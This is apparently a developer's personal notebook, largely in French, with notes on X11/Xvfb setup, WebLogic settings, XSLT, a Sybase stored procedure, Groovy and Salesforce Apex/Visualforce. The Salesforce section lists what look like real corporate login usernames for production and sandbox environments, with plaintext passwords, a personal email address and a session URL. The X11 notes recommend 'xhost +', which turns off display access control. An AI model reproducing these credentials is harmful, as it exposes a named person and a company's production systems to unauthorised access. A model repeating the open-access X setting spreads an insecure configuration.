"xhost +" will allow all users access to the xhost. If more security is necessary, specify specific users after the "+" sign.
Please understand that the xhost is a utility built into Unix shells and is not supported by MapInfo Technical Support. For more information, check out the manual pages for xhost by issuing "man xhost" at the command shell, or by consulting unix/linux documentation.
Last Modified: 
Document URL: http://testdrive.mapinfo.com/techsupp/miprod.nsf/kbase_by_product/D3BE2C4137D3197D85256C24005EBD3D
Error "java.lang.InternalError: Can't connect to X11 window server using ':0.0' as the value of the DISPLAY variable".^D3BE2C4137D3197D85256C24005EBD3D^Y
------------------------------
Sun's AWT requires an X server to operate. You must have your DISPLAY variable set to a functioning X server. 
For example: setenv DISPLAY=localhost:0.0 export DISPLAY 
When using JSP with Apache try the following:
add wrapper.env=DISPLAY=system_name:0.0 to jserv.properties
Make sure the system is logged in with a display running and the system has access to the display using the xhost + command. 
Sun's patch 107078-18 corrects some of the "Can't connect to X11 server" problems on Solaris. 
On Redhat Linux try this: in an xterm session (shell) type xhost +
------------------------------
LD_LIBRARY_PATH=/logiciels/bea/wlserver6.1SP2/lib/solaris:/logiciels/bea/wlserver6.1SP2/lib/solaris/oci816_8
CLASSPATH=/logiciels/bea/jdk131/lib/tools.jar:/logiciels/bea/wlserver6.1SP2/lib/weblogic_sp.jar:/logiciels/bea/wlserver6.1SP2/lib/weblogic.jar:
PATH=/logiciels/bea/wlserver6.1SP2/bin:/logiciels/bea/jdk131/jre/bin:/logiciels/bea/jdk131/bin:/logiciels/bea/wlserver6.1SP2/lib/solaris:/usr/sbin:/usr/bin:/usr/ucb:/usr/openwin/bin:/usr/opt/SUNWmd/sbin:/opt/VRTSvmsa/bin:/etc/vx/bin:/usr/local/bin:/usr/local/sbin:/usr/local/etc
logiciels/bea/wlserver6.1SP2/lib/solaris
____________
Xvfb
Get a RPM named XFree86-Xvfb-3.3.5-3.i386.rpm 
I use it like this : 
/usr/bin/X11/Xvfb -screen 0 640x480x24 -fp /usr/X11R6/lib/X11/fonts/misc -co 
/usr/X11R6/lib/X11/rgb -pixdepths 8 16 24 32 & 
Here is information I posted sometime ago that should help: 
Try running Xvfb (virtual frame buffer). We used it to produce GIF 
files on 
our Solaris system. 
http://mapserver.arsdigita.com/pms/doc/xvfb.adp 
This is the startup script I am using: 
#!/bin/sh 
# start the X Virtual Framebuffer (Xvfb) *kob* 3/22/96 
if [ -f /usr/X11R6/bin/Xvfb ]; then 
        echo "***Starting up the Virtual Frame Buffer on Screen 1***" 
        /usr/X11R6/bin/Xvfb :1 -screen 0 1152x900x8 2>> 
/usr/var/adm/Xvfb.log 
fi 

I added the following to srun.sh: 

# 
# for Xvfb 
# 
DISPLAY=:1.0 
export DISPLAY 

FYI We're using the Acme gifEncoder for the GIF rendering. 
__________________________
# Set user-defined variables.
JAVA_HOME=/logiciels/bea/jdk131
WL_HOME=/logiciels/bea/wlserver6.1SP2
JAVA_OPTIONS="-Xms64m -Xmx256m"
# PJA options : Drawing in offscreen withowt X11 DISPLAY
PJA_OPTIONS="-Xbootclasspath/a:$WL_HOME/ext/pja.jar:$WL_HOME/ext/javachart.jar -Djava.awt.fonts=$JAVA_HOME/jre/lib/fonts -Djava.awt.graphicsenv=com.eteks.java2d.PJAGraphicsEnvironment -Djava2d.font.usePlatformFont=false -Dawt.toolkit=com.eteks.awt.PJAToolkit"
SERVER_NAME=WLS1-WGC
ADMIN_URL=http://130.98.232.97:7001




-----------------------
(javax et les transformation c de la merde eviter d'utiliser si trop gros volume)
Struts avec XML , XSLT (utilisation de la classe XSLServlet qui serialise une ActionForm en XML)
Transformation example 
Consider a Struts application with a simple form bean containing two attributes: 

  public class TestForm extends ActionForm {
      private String testString;
      private List testList;
  }


The XML serialization code produces the following XML fragment, assuming testString and testList are populated respectively with My Test String and One, Two, Three. Note that the element names in the XML document are predictable, making it easy to write the stylesheet: 

  <page name="TestForm">
    <request>
      <TestForm>
        <testString>My Test String</testString>
        <testList>
          <item>One</item>
          <item>Two</item>
          <item>Three</item>
        </testList>
      </TestForm>
    </request>
  </page>


XSL : TRANSFORMATION :(javax et les transformation c de la merde eviter d'utiliser si trop gros volume)
This simple XSLT template transforms the serialized stream to an XHTML fragment: 
On peut tester facilement sa transformation xsl avec Internet Exprorer: 
				mettre en tete du fichier xml: <?xml-stylesheet type="text/xsl" href="chemin/vers/mon/fihicier/xsl.xsl"?>
  <xsl:template match="page"> 
  ou nombalise[@attribut=1] 
  ou nombalise[1] 
  ou nombalise[lavaleurdemabalise] 
  ou nombalise[nomsousbalise='valeursousbalise']
     <h2>Please enter some text and submit</h2>
     <br/>
     <form name="testForm" method="get" action="result">
       <input type="text" name="testString" 
value="{request/TestForm/testString}"/>
       <br/>
       <select name="outSelect">
          <xsl:for-each select="request/TestForm/testList/item">


            <option><xsl:value-of select="."/></option>
          </xsl:for-each>
       </select>
       <br/>
       <input type="submit" value="Submit"/>
     </form>
     <hr/>
   </xsl:template>


After transformation and HTML serialization, the result will look like this: 

  <h2>Please enter some text and submit</h2>
  <br>
  <form name="testForm" method="get" action="result">
    <input type="text" name="testString" value="My Test String">
    <br>
    <select name="outSelect">
      <option>One</option>
      <option>Two</option>
      <option>Three</option>
    </select>
    <br>
    <input type="submit" value="Submit">
  </form>
  <hr>
contraction:
		plutot que d'utiliser <xsl:value-of select="blabla"/> on peut carrement mettre: {blabla}
quand on a une erreur avec "&":
		 c parce que le transformeur l'interprete. Il faut utiliser &amp; (echappement)
choose et when: (when doit etre inclu dans choose)
			       			<xsl:choose><xsl:when test="/ResultSet/Pagination/TotalLines!='0'">
									<a onMouseOut="window.status='';return(true)" 
									href="javascript:ouvreAide('/dwi/subapps/epri/formats/html/pageAide6.htm')" class="RequeteLienAide">Lexique
									</a>
									</xsl:when></xsl:choose>

Procedure stockee sybase :
proc sybase
/******************************************************************************/
/* Nom : PS_CREANCES_LIST							         */
/* Auteur : Laurent Duverge						      */
/* Date de creation : 22/11/2005					      */
/* Description : renvoie la table CREANCES					*/
/* Parametres en entree :							*/
/*				              entite char(3)				*/
/*				              fond char(3)				*/
/*				              compartiment char(3)				*/
/*				              datearrete datetime				*/
/*				              datetraitement datetime			*/
/*				              status char(10)					*/

/* Parametres de sortie :						         */
/******************************************************************************/
use TITRISATION
go

if exists (select 1
	      from sysobjects
	     where name = 'PS_CREANCES_LIST'
	      and type = 'P')
  drop proc PS_CREANCES_LIST
go

create proc PS_CREANCES_LIST(
	@error_code int Output,
 	@id_msg     varchar(200) Output,
	@msg_param  varchar(200) Output,
    @idFcc char(10),
    @idCompartiment char(10),
   @datearrinf 		datetime,
   @datearrsup 		datetime,
   @datetrtinf 		datetime,
   @datetrtsup 		datetime,
   @state char(10)
)
as

if (@idFcc = 'N/A')
		select @idFcc = '%'
		
if (@idCompartiment = 'N/A')
		 select @idCompartiment = '%'

if (@state = 'N/A')
		 select @state = '%'

if   ( @datearrinf ='' ) or (@datearrinf is null)
		select @datearrinf ='19000101'


if   ( @datetrtinf ='' ) or (@datetrtinf is null)
		select @datetrtinf ='19000101'
		
if   ( @datetrtsup ='' ) or (@datetrtsup is null)
		select @datetrtsup ='20500101'


if   ( @datearrsup ='' ) or (@datearrsup is null)
		select @datearrsup ='20500101'

  declare @CrcesPNP int
  declare @CrcesFNP int
  declare @CrcesPurg int
  declare @clecomp int
  declare @logclecomp  varchar(20)
  declare @logidcycle  varchar(20)
  declare @logCrcesPNP  varchar(20)
  declare @logCrcesFNP  varchar(20)
  declare @logCrcesPurg  varchar(20)
  
  declare @idcycle int
  declare @reqCrcesPNP varchar(200)
  declare @reqCrcesFNP varchar(200)
  declare @reqCrcesPurg varchar(200)
  declare @nomtablecreance varchar(200)

create table #creances_stat (ID_CYCLE int, ID_ENTITE varchar(20) null,ID_FCC varchar(20) null,
				ID_COMPARTIMENT varchar(20) null,DT_BEGIN_CYCLE datetime,
				DT_ARRETE_CYCLE datetime, CRCESPNP int null, CRCESFNP int null,CRCESPURG int null)
create table #toto (nb_ligne int null)

declare  keycomp cursor for
	select 	c.KEY_COMP, cy.ID_CYCLE from COMPARTIMENT c 
	inner join CYCLE cy ON cy.ID_FCC = c.ID_FCC AND cy.ID_COMPARTIMENT=c.ID_COMPARTIMENT
	inner join blabla etc...
	where c.ID_FCC like @idFcc and c.ID_COMPARTIMENT like @idCompartiment
open keycomp
fetch keycomp into @clecomp, @idcycle
while (@@sqlstatus = 0)
begin
	print "clecomp"
	select @logclecomp = CONVERT(varchar,@clecomp)
	print @logclecomp
	print "idcycle"
	select @logidcycle = CONVERT(varchar,@idcycle)
	print @logidcycle
	
	
	select @nomtablecreance ="CREANCE_"+CONVERT(varchar,@clecomp)
	if exists (select 1 from sysobjects where type = 'U' and name like @nomtablecreance)
	begin
		select @reqCrcesPNP = "insert into #toto select  COUNT(ID_CREANCE) from CREANCE_"+CONVERT(varchar,@clecomp)+" where FLG_FATHER LIKE 'Y' and PURGE like 'N' and ID_CYCLE = "+CONVERT(varchar,+@idcycle)
		execute (@reqCrcesPNP )
		select @CrcesPNP = nb_ligne from #toto
		delete from #toto
		select @reqCrcesFNP = "insert into #toto select  COUNT(ID_CREANCE) from CREANCE_"+CONVERT(varchar,@clecomp)+" where FLG_FATHER LIKE 'N' and PURGE like 'N'  and ID_CYCLE = "+CONVERT(varchar,+@idcycle)
		execute (@reqCrcesFNP )
		select @CrcesFNP = nb_ligne from #toto
		delete from #toto
		select @reqCrcesPurg = "insert into #toto select  COUNT(ID_CREANCE) from CREANCE_"+CONVERT(varchar,@clecomp)+" where PURGE like 'Y'  and ID_CYCLE = "+CONVERT(varchar,+@idcycle)
		execute (@reqCrcesPurg )
		select @CrcesPurg = nb_ligne from #toto
		delete from #toto

		print "creancesPNP"
		select @logCrcesPNP = CONVERT(varchar,@CrcesPNP)		
		print @logCrcesPNP
		print "Creances FNP"
		select @logCrcesFNP = CONVERT(varchar,@CrcesFNP)		
		print @logCrcesFNP


		insert into #creances_stat (ID_CYCLE, ID_ENTITE,ID_FCC,ID_COMPARTIMENT,DT_BEGIN_CYCLE,
		DT_ARRETE_CYCLE, CRCESPNP, CRCESFNP, CRCESPURG)
		select @idcycle, c.ID_ENTITE, c.ID_FCC, c.ID_COMPARTIMENT,
		c.DT_BEGIN_CYCLE, c.DT_ARRETE_CYCLE, @CrcesPNP , @CrcesFNP , @CrcesPurg 
		from CYCLE c where c.ID_FCC like @idFcc
		and c.IS_CLOSED like @state 
		and c.ID_COMPARTIMENT like @idCompartiment
		and c.DT_BEGIN_CYCLE between @datetrtinf and @datetrtsup
		and c.DT_ARRETE_CYCLE between @datearrinf and @datearrsup

end
fetch keycomp into @clecomp, @idcycle
end
close    keycomp 
deallocate cursor keycomp 		

	


SELECT ID_CYCLE, ID_ENTITE,ID_FCC, ID_COMPARTIMENT,DT_BEGIN_CYCLE,	DT_ARRETE_CYCLE, CRCESPNP,
 CRCESFNP, CRCESPURG from #creances_stat

   drop table #creances_stat


return 0
go
groovy :
  syntaxe :
    x = new java.util.Date()
    // liste: 
        emptyList = []
        myList = [1776, -1, 33, 99, 0, 928734928763]
        myList[0] // renvoit 1776
        myList.length // renvoit 6
        each // pour faire un for
        ou 
        for (i in 0..len-1) {...}
    //maps :
        emptyMap = [:] 
        scores = [ "Brett":100, "Pete":"Did not finish", "Andrew":86.87934]
        scores.Brett // pour recuperer un element du map
        scores["toto"]=5 // ajoute des donnees à la map
             
  Domaines : 
    class Song
    {
      String title
      String author
      int duration
      
      static constraints={author(nullable:true)}
      static namedQueries={longSongs{second -> gt 'duration'.seconds}}    // requete retourne objets dont duree plus grand que param
  Tests :
    void test1()
    {
      def song = Song.create()
      song.duration=300
      song.title="bla"
      song.save()
      assert Song.longSongs(90).count()==3
      assert Song.longSongs(90).findByArtistIsNotNullAndDurationGreaterThanAndTitle(100. "blah").title=="Bli"
    }      
  Controllers :
grails :


       
logiciel analyseur de sons audio detail infos : 
    gspot       

convertir un youtube en son
      https://h2converter.com/ avant: http://www.youtube-mp3.org/fr


SALESFORCE :
organisation des licences, des environnements et des sandboxes : 
  une prod (http://login.salesforce.com) a une licence qui a 0 ou X sandboxes (http://test.salesforce.com) de different types (DEV, DEV PRO ETC...) contenant chacune x utilisateurs ayant tous un username UNIQUE dans TOUT salesforce international
      on peut faire un refresh d'une sandbox a partir de soit la prod soit une autre sendbox

apex :
attention si nouveau compte première fois logguer bien d'abord supprimer tous les cookies et historiques
    env: production/ sandbox:merge (multiples)
    faq forum : 
        http://developer.salesforce.com/forum
        reference du developpeur : https://developer.salesforce.com/docs/
/*
    POUR SE CONNECTER PAR UNE LICENCE COMMUNITY
    https://hqrfomerge-networkcty.cs17.force.com
    https://hqrfomerge-networkcty.cs17.force.com/login
    https://hqrfomerge-networkcty.cs17.force.com/DLPAWarranty */
    
  CORE: 
    https://hqsfamerge-networkcty.cs17.force.com
  SFA:
    https://test.salesforce.com/
    HQsfaDevPB    8.0
    laurent.l.duverge-renexter@renault.com.hqsfadev
     arreter1 
                                   https://cs17.salesforce.com/01j/e?Parent=101g00000001Nps&retURL=%2F101g00000001Nps
                                    https://hqsfadevpb-networkcty.cs17.force.com
      
               
               BICLMT
                                            https://cs20.salesforce.com/_ui/core/chatter/ui/ChatterPage
               laurent.l.duverge-renexter@renault.com.biclmt
               arreter1
               
               

                                ou
                                https://cs17.salesforce.com/01j/e?Parent=101g00000001Nps&retURL=%2F101g00000001Nps      
     
              DEV1 8.1 passe à la 9.1
               laurent.l.duverge-renexter@renault.com.hqprod(provenanceDonneesEtMetadonnees).hqsfadev1(sandboxActuelle)
               laurent.l.duverge-renexter@renault.com.hqprod.hqsfadev1
                       (il y a hqprod car ricardo ma explique que quand on refresh une sandbox des donnees de prods et du coup hqprod...dev s'ajoute car chaque iduser est unique.)
                avant : laurent.l.duverge-renexter@renault.com.hqsfadev1 (hqprod à l'epok avait ete enleve à la main )
               arreter2 (sinon 1)
              UAT 
               laurent.l.duverge-renexter@renault.com.hqprod.hquat
               arreter1
               
              PROD
              laurent.l.duverge-renexter@renault.com.hqprod
              arreter1
              
    
              AUTRE MERGE HqSfaMerge
              laurent.l.duverge-renexter@renault.com.hqprod.hqsfamerge
              (mdp le meme qu'en prod donc peut etre arreter1)

              DEV 9.0
              laurent.l.duverge-renexter@renault.com.hqprod.hqsfadevmj

            PERSO : 
                  https://login.salesforce.com/
                  kanailaurent@gmail.com

    
    
    User Name:  https://hqsfadevpb-networkcty.cs17.force.com (un identifiant par projet. Il m'a attribue qu'une instance.)
    Password: arreter1
        https://test.salesforce.com/?c=1gaiJOUo0NMcbkFRBgUl5uWseyyK6GyaF912B%2BNmm4DmLJfkYYNXtE7WT%2FSet9FdhmIAKRa51RnoOFfN5yR6e6nMO7qNl4Rz73fcgaxLKOYk7mENDPPCHWcd7CfMKAM57l5%2BgmQu7rjr2D3j%2BiBIpiiNcC8uY6bh5O%2Fw3pIxBYvR0jI%2FiWcP1M%2FPEmmmxJjNFFUzVoqbmFiIu7dxMBYgYrE3zXUWYW2A3WqI0NQtxKclNMTEI7witS3olzpvbhYJBmtj7kSAbSZNK9rHVXADA
    pour avoir le plugin salesforce:
          https://developer.salesforce.com/page/Force.com_IDE_Installation

    creation Nouveau projet Apex sous eclipse: Classes-triger-pages-component-staticresource sont propre à mon projet Renault
                                                les metadatas sont commune à tout salesforce
                                                ne pas oublier ensuite de faire clic droit sur projet >force > work online
    ADMINISTRATION :
      Un user a UN seul profil (1 licence par profile. Possible creer des profils issus des profiles standards) et un seul role et DES permissions en plus (pour affiner. ont la precedence)
      Les profils utilises sont : 
                  Tous les profils commençant par « LMTSFA – » 
                  System Administrator.
                  Call Center = plateforme user (qualification du lead)
                  Salesman
                  CSMO
                  Partner users
                                                 
    DEVELOPPEMENT :
      pour connaitre le type d'objet par son identifiant en cas de polymorphisme : prefixe
                    tous les ID des users commencent par 005 :
                    on peut faire : Opportunity.getSObjectType().getDescribe().getKeyPrefix() 
                        if(owid.startsWith('005')){ 
            ACCOUNT                     '001' 
            QUOTE                       '0Q0' 
            NOTE                        '002' 
            CONTACT                     '003' 
            USERS                       '005' 
            OPPORTUNITY                 '006' 
            ACTIVITY                    '007' 
            OPPORTUNITY_HISTORY         '008' 
            FORECAST_ITEM               '00A' 
            FILTER                      '00B' 
            DELETE_EVENT                '00C' 
            ORGANIZATION                '00D' 
            USER_ROLE                   '00E' 
            QUEUE                       '00G' 
            GROUPS                      '00G' 
            PARTNER                     '00I' 
            OPPORTUNITY_COMPETITOR      '00J' 
             OPPORTUNITY_CONTACT_ROLE   '00K' 
            CUSTOM_FIELD_DEFINITION     '00N' 
            REPORT                      '00O' 
            ATTACHMENT                  '00P' 
            LEAD                        '00Q' 
            IMPORT_QUEUE                '00S' 
            TASK                        '00T' 
            EVENT                       '00U' 
            EMAIL_TEMPLATE              '00X' 
            EMAIL_TEMP                  '00Y' 
            COMMENTS                    '00a' 
            CUSTOM_RESOURCE_LINK        '00b' 
            TRAINING                    '00c' 
            PROFILE                     '00e' 
            MH_BLUESHEET                '00f' 
            MH_GOLDSHEET                '00g' 
            LAYOUT                      '00h' 
            PRICEBOOK_MAPPING           '00i' 
            PRICEBOOK_ENTRY_MAPPING     '00j' 
            OPPORTUNITY_LINEITEM        '00k' 
            FOLDER                      '00l' 
            EMAIL_ATTACHMENT_LOOKUP     '00m' 
            EMAIL_ATTACHMENT_ARCHIVE    '00n' 
            LINEITEM_SCHEDULE           '00o' 
            USER_TEAM_MEMBER            '00p' 
            OPP_TEAM_MEMBER             '00q' 
            ACC_SHARE                   '00r' 
            ACC_SHARE_DEFAULT           '00s' 
            OPP_SHARE                   '00t' 
             OPP_SHARE_DEFAULT          '00u' 
            CAMPAIGN_MEMBER             '00v' 
            PAYMENT_APPLICATION         '00w' 
            BILLED_PRODUCT              '00x' 
            PURCHASE_RULE               '00y' 
            PURCHASE_RULE_ENTRY         '00z' 
            CASE_SOLUTION               '010' 
            GROUP_MEMBER                '011' 
            RECORD_TYPE                 '012' 
            RECORD_TYPE_PICKLIST        '013' 
            PROFILE_RECORD_TYPE         '014' 
            DOCUMENT                    '015' 
            BRAND_TEMPLATE              '016' 
            ENTITY_HISTORY              '017' 
            EMAIL_STATUS                '018' 
            BUSINESS_PROCESS            '019' 
            BUSINESS_PROCESS_PICKLIST   '01A' 
            LAYOUT_SECTION              '01B' 
            LAYOUT_ITEM                 '01C' 
            PROFILE_LAYOUT              '01G' 
            MAILMERGE_TEMPLATE          '01H' 
            CUSTOM_ENTITY_DEFINITION    '01I' 
            PICKLIST_MASTER             '01J' 
            CURRENCY_TYPE               '01L' 
            ACC_TEAM_MEMBER             '01M' 
            ACTIVE_CONTENT              '01N' 
            USER_UI_CONFIGURATION       '01O' 
            PROFILE_TAB_CONFIGURATION   '01P' 
            WORKFLOW_RULE               '01Q' 
            RULE_FILTER                 '01R' 
            RULE_FILTER_ITEM             '01S'
            RULE_FILTER_ACTION          '01T' 
            ACTION_ASSIGN_ESCALATE      '01U' 
            ACTION_TASK                 '01V' 
            ACTION_EMAIL                '01W' 
            ACTION_EMAIL_RECIPIENT      '01X' 
            CAMPAIGN_MEMBER_STATUS      '01Y' 
            DASHBOARD                   '01Z' 
            DASHBOARD_COMPONENT         '01a' 
            FILTER_ITEM                 '01b' 
            FILTER_COLUMN               '01c' 
            FOLDER_GROUPS               '01d' 
            PICKLIST_SET                '01e' 
            WEBEX_MEETING               '01f' 
            API_QUERY                   '01g' 
            TRANSLATION                 '01h' 
            TRANSLATION_USER            '01i' 
            TRANSLATION_VALUE           '01j' 
            PROFILE_FLS_ITEM            '01k' 
            ACTION_RESPONSE             '01l' 
            BUSINESS_HOURS              '01m' 
            CASE_SHARE                  '01n' 
            LEAD_SHARE                  '01o' 
            CUSTOM_TAB_DEFINITION       '01r' 
            PRICEBOOK2                  '01s' 
            PRODUCT2                    '01t' 
            PRICEBOOK_ENTRY             '01u' 
            PRICEBOOK_SHARE             '01v' 
            OPP_UPDATE_REMINDER         '01w' 
            OPP_UPDATE_REMINDER_STATS   '01x' 
            CASE_SHARE_DEFAULT          '01y' 
            CASE_ESCALATION             '01z' 
            EVENT_ATTENDEE              '020' 
            QUANTITY_FORECAST           '021' 
            FISCAL_YEAR_SETTINGS        '022' 
            APP_CALENDAR                '023' 
            APP_CALENDAR_SHARING        '024' 
            LIST_LAYOUT_ITEM            '025' 
            PERIOD                      '026' 
            REVENUE_FORECAST            '027' 
            OPPORTUNITY_OVERRIDE        '028' 
            LINEITEM_OVERRIDE           '029' 
            LEAD_SHARE_DEFAULT          '02A' 
            LABEL_DEFINITION            '02B' 
            LABEL_DATA                  '02C' 
            CASES_HISTORY2              '02D' 
            HELP_SETTING                '02E' 
            CUSTOM_FIELD_MAP            '02F' 
            MH_GOLD_PROGRAM             '02H' 
            MH_GOLD_INFORMATION         '02I' 
            MH_GOLD_CONTACT             '02J' 
            MH_GOLD_ACTION              '02K' 
            MH_CUSTOMER_CRITERION       '02L' 
            MH_GREENSHEET               '02M' 
            MH_GREEN_GIVE_INFO          '02N' 
            MH_GREEN_GET_INFO           '02O' 
            MH_CONTACT_ROLE             '02P' 
            MH_INFORMATION              '02Q' 
            USER_PREFERENCE             '02R' 
            HTML_COMPONENT              '02S' 
            CUSTOM_PAGE                 '02T' 
            CUSTOM_PAGE_ITEM            '02U' 
            PAGE_COMPONENT              '02V' 
            CUSTOM_PAGE_PROFILE         '02X' 
            USER_COMPONENT_DATA         '02Y' 
            ACCOUNT_CONTACT_ROLE        '02Z' 
            CONTRACT_CONTACT_ROLE       '02a' 
            COMPONENT_RESOURCE_LINK     '02b' 
            DIVISION                     '02d'
            DIVISION_WORKFLOW_RULE      '02e' 
            DELEGATE_GROUP              '02f' 
            DELEGATE_GROUP_MEMBER       '02g' 
            DELEGATE_GROUP_GRANT        '02h' 
            ASSET                       '02i' 
            PROFILE_ENTITY_PERMISSIONS  '02j' 
            LIST_LAYOUT                 '02k' 
            OUTBOUND_QUEUE              '02l' 
            CUSTOM_INDEX                '02m' 
            CATEGORY_NODE               '02n' 
            CATEGORY_DATA               '02o' 
            DIV_TRANSFER_EVENT          '02p' 
            LAYOUT_ITEM_COLUMN          '02q' 
            OPPORTUNITY_ALERT           '02r' 
            EMAIL_MESSAGE               '02s' 
            EMAIL_ROUTING_ADDRESS       '02t' 
            TAB_SET                     '02u' 
            TAB_SET_MEMBER              '02v' 
            LOGIN_IP_RANGE              '02w' 
            LOGIN_HOURS                 '02x' 
            REPORT_AGGREGATE            '02y' 
            REPORT_COLOR_RANGE          '02z' 
            PROFILE_TAB_SET             '030' 
            USER_TAB_SET_MEMBER         '031' 
            ACC_TERRITORY_RULE          '032' 
            PROJECT                     '033' 
            PROJECT_MEMBER              '034' 
            SELF_SERVICE_USER           '035' 
            JOB_QUEUE                   '036' 
            REPORT_COLUMN               '037' 
            REPORT_FILTER_ITEM          '038' 
            REPORT_BREAK                '039' 
            DEPENDENT_PICKLIST          '03a' 
            PACKAGE_EXPORT              '03b' 
            LAYOUT_RIGHT_PANEL          '03c' 
            CUSTOM_SETUP_DEFINITION     '03e' 
            CUSTOM_SETUP                 '03f'
            REPORT_PARAM                '040' 
            ACC_TERRITORY_ASSIGN        '041' 
            ACC_TERR_ASSIGN_RULE_ITEM   '042' 
            OUTBOUND_FIELD              '043' 
            USER_TERRITORY              '04S' 
            TERRITORY                   '04T' 
            DNB_ACCOUNT_MAPPING         '04U' 
            DNB_FIELD                   '04V' 
            REVENUE_FORECAST_HISTORY    '04W' 
            QUANTITY_FORECAST_HISTORY   '04X' 
            CONTENTVERSION              '068' 
            CONTENTDOCUMENT             '069' 
            ENTITY_PERMISSION           '110' 
            SFDC_PARTNER                '204' 
            SFDC_DIVISION               '208' 
            CASES                       '500' 
            SOLUTION                    '501' 
            BILLING_DIVISION            600'  
            BILLING_ORDER               601'  
            CURRENCY                    602'  
            PLAN                        604'  
            PRODUCT                     '605' 
            BILLING_ORDER_ITEM          '606' 
            PLAN_PRODUCT                '607' 
            CAMPAIGN                    '701' 
            FIELD_HISTORY               '737' 
            UI_STYLE_DEFINITION         '766' 
            UI_STYLE                    '777' 
            CONTRACT                    '800' 
            ORDERS                      '801' 
            ORDER_ITEM                  '802' 
            INVOICE                     '803' 
            INVOICE_ITEM                '804' 
            PAYMENT                     '805' 
            APPROVAL                    '806' 
            URI_BLOCK_RULE              '807' 
            CUSTOM_ENTITY_DATA          'a00' 
            SERVICECONTRACT             '810' 
            
      pour voir rapidos tous les objets : 
            https://workbench.developerforce.com/select.php    
        Developperconsole : (mon nom > Developpement console)
            Debug>openExecuteAnonymous pour faire du code anonyme
        si objet a nom "...__c" c'est un objet custom
        DML :    
        pour "commiter" une liste d'objet mis à jour automatiquement (merge) dans la base de donnee : 
          upsert malisteDObjet;
        exemple de requete : 
            Id PERSONAL_ID = [select Id from RecordType where sObjectType = 'Account' and DeveloperName = 'CORE_ACC_Personal_Account_RecType' limit 1].Id;		
            Log Console : 
          possibilite filtrer type de logs par exemple saisir "ERROR" dans champ filtre
          bouton : "show my current log only"
          
          PAGE VISUAL FORCE : PAGE :
          pour recuperer un label de champ d'objet : 
                label="{!$ObjectType['Lead'].fields['origine__c'].Label}"
                {!$ObjectType['techObjectVF'].fields['origin'].Label} 
          pour faire des strings remplacement avec les custom labels resource concat:
                              <apex:outputText style="font-style:italic" value="This is {0} text with {1}."> ou value peut être un label :value="{!$Label.LMT_Email_Confirm_Customer_TestDrive}"
                         <apex:param value="my"/>
                         <apex:param value="arguments"/>
                      </apex:outputText>
          pour declarer sa page : 
              <apex:page id="SFA_360Vision" label="SFA_360Vision" name="SFA_360Vision" standardController="Account(MonObjet)" extensions="SFA_360Vision_CTR(maclasse)">
            pour faire reference aux ressources resources statiques css js images : 
                  <apex:includeScript value="{!$Resource.MyJavascriptFile}"/>
                  <apex:image url="{!URLFOR($Resource.TestZip, 'images/Bluehills.jpg')}" width="50" height="50"/>
           reference : https://eu5.salesforce.com/apexpages/apexcomponents.apexp
           si dans ma page j'ai un iframe et que je veux raffraichir toute la page alors faire : 
                                                   var ext = window.location.pathname.substring(1,window.location.pathname.length); // "sfa/blabla" ou ""
                                                    if (ext.indexOf("/")!=-1)
                                                    {
                                                         if (ext.indexOf("servlet")!=-1)
                                                         {
                                                             ext=ext.substring(0,ext.indexOf("servlet"));
                                                         }
                                                         ext=ext.substring(0,ext.indexOf("/"))+"/";
                                                     }
                                                        window.top.location=window.location.protocol + "//" + window.location.host + "/" + ext+"{!Lead.id}";
                                                        
      pour faire un block avec un titre div titre :
              <apex:pageBlock id="theBlock1" mode="edit"   title="{!$Label.SFA_ActivityReport_Title}" >
              </apex:pageBlock> 
        Pour faire un select : 
            cote page : 
             <apex:selectList multiselect="false" size="1">
                  <apex:selectOptions value="{!dealersFromUser}"/>
              </apex:selectList>
              cote controlleur : 
                       public List<SelectOption> getDealersFromUser()
                                {
                                 System.debug('#### TestLaurentCTRL');
                                   List<SelectOption> options = new List<SelectOption>();
                                    List<Lead_Dealer_Queue__c> dealers = [SELECT Id, Queue_Name__c FROM Lead_Dealer_Queue__c WHERE createdby.id= :UserInfo.getUserId()];
                                    Lead_Dealer_Queue__c toto = new Lead_Dealer_Queue__c();
                                    toto.Queue_Name__c='tata';
                                    dealers.add(toto);
                                    Lead_Dealer_Queue__c titi = new Lead_Dealer_Queue__c();
                                    titi.Queue_Name__c='titi';
                                    dealers.add(titi);
                                   System.debug('#### Lead_TriggerHandlerTest - testLeadWakeup - myLead.OwnerId : ' +myLead.OwnerId);
                                    for (Integer i=0; i<dealers.size(); i++)
                                    {
                                        System.debug('#### TestLaurent' + i);
                                        if (dealers.get(i).Queue_Name__c!=null)
                                        {
                                            options.add(new SelectOption(dealers.get(i).Queue_Name__c,dealers.get(i).Queue_Name__c));
                                        }
                                    }
                                    return options;
                                } 
           pour faire de l'ajax :   (voir aussi actionFunction)
                  avec un select
                                <apex:selectList id="chooseColor" value="{!string}" size="1">
                                    <apex:selectOption itemValue="detail" itemLabel="Detail"/>
                                    <apex:selectOption itemValue="history" itemLabel="History"/>
                                    <apex:selectOption itemValue="opentasks" itemLabel="Open Activities"/>
                                   <apex:actionSupport event="onchange" action="{!methodeDuControleur}" reRender="out"/> // la methode du controleur ne renvoit rien mais elle set une variable dans le controleur qui est accessible par la page.
                                </apex:selectList>
                                Puis le div qui se rafraichit 
                                         <apex:outputPanel id="userPicklist">
                                                        <apex:selectList multiselect="false" size="1">
                                                              <apex:selectOption itemValue="--" itemLabel="--"/>                      
                                                              <apex:selectOptions value="{!variableDuControleurQuiAeteMiseAjourParLaMethodeMethodeDuCOntroleur}"/>
                                                          </apex:selectList>
                                           </apex:outputPanel>
            pour afficher un truc (bouton , lien etc ) de manière conditionnelle if)
                utiliser rendered
                            <apex:commandButton onclick="javascript:thankYouLetter();" value="{!$Label.SFA_Button_ThankYouLetter}" rendered="{!ctr.isThankYouLetterEnabled && ctr.idThankYouEmailTemplate!=''}"/>
                  avec un lien (retour ajax)
                         <apex:commandLink reRender="idDeLobjetQuiVaSeRafraichirApresRetourAjax">
                          (...)
                         </apex:commandLink>         
                         <apex:outputPanel id="idDeLobjetQuiVaSeRafraichirApresRetourAjax">
                                      (...)
                         </apex:ouputPanel>
          pour faire une methode appellee par un bouton de commande : 
                      public PageReference createAccountFromLead()
                    {
                    
          pour ecrire un joli message sur la page : 
              		ApexPages.addMessage(new ApexPages.Message(ApexPages.Severity.ERROR, 'This Account is already created'));      
                  <apex:page controller="MonController"> //MonController est dans Open>Classes>
              boucle :
                    <apex:repeat value="{!data.items}" var "img">
                        ...html... {!img.nom}...html...
                    </apex:repeat>
                </apex:page>
          les conditions dans les styles : 
              style="{!IF(lead.Account__c==null, 'display:none', 'display:inline')}
          pour qu'une commande button refresh recharge reload toute la page
